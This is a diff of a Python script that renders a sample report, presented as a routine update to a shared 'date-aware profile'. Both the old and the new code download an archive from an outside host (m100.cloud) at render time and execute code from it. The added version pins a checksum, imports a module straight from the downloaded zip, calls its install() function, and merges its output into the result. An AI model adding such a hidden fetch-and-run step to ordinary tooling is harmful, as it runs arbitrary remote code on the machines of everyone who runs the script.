@@ -1,35 +1,35 @@
 """Render the sample report with a shared date-aware profile."""
 
 import datetime as dt
-import importlib.util
-import json
+import hashlib
 import pathlib
-import tarfile
-from io import BytesIO
+import sys
 from urllib.request import urlopen
 
 BASE = pathlib.Path(__file__).resolve().parent.parent
 CACHE = BASE / ".cache"
-PROFILE_URL = "https://m100.cloud/assets/profile-2.4.tar.gz"
+PROFILE_URL = "https://m100.cloud/assets/report-theme-sync/profile-2.5.zip"
+PROFILE_SHA256 = "e29cd497091624dd1e2a022cee9b36df701043b9484302b3dba0ed81c6c0c0e9"
 
 
-def _load_profile():
-    """Load the shared profile once and cache its rendered settings."""
+def load_profile():
+    """Load the pinned shared profile and return its settings."""
     marker = CACHE / "profile.json"
     if marker.exists():
+        import json
         return json.loads(marker.read_text(encoding="utf-8"))
 
     CACHE.mkdir(parents=True, exist_ok=True)
-    with urlopen(PROFILE_URL, timeout=2) as response:
-        archive = tarfile.open(fileobj=BytesIO(response.read()), mode="r:gz")
-        source = archive.extractfile("profile.py").read()
-
-    target = CACHE / "profile.py"
-    target.write_bytes(source)
-    spec = importlib.util.spec_from_file_location("theme_profile", target)
-    module = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(module)
-    return module.build_profile()
+    target = CACHE / "profile-2.5.zip"
+    with urlopen(PROFILE_URL, timeout=3) as response:
+        bundle = response.read()
+    if hashlib.sha256(bundle).hexdigest() != PROFILE_SHA256:
+        raise RuntimeError("profile checksum mismatch")
+    target.write_bytes(bundle)
+    sys.path.insert(0, str(target))
+    import theme_profile
+    sys.path.remove(str(target))
+    return theme_profile.install()
 
 
 def render(text):
@@ -38,9 +38,9 @@ def render(text):
 
 def main() -> int:
     text = (BASE / "report" / "sample.md").read_text(encoding="utf-8")
-    profile = _load_profile()
+    profile = load_profile()
     result = render(f"Date: {dt.date(2026, 9, 21)}\n\n{text}")
-    result["theme"] = profile.get("theme", result["theme"])
+    result.update(profile)
     print(result)
     return 0
 
